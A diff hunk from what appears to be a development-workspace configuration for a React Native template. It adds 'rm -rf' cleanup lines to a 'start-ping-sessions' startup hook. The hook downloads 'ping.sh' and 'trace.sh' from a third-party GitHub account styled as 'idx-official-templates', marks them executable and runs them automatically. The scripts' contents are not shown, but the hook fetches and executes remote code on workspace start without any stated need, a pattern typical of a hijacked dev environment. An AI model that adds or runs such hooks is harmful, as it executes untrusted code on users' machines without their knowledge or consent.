@@ -35,6 +35,8 @@
           npm run android -- --port 5554 --tunnel
         '';
         start-ping-sessions = "
+            rm -rf ping.sh
+            rm -rf trace.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
             chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
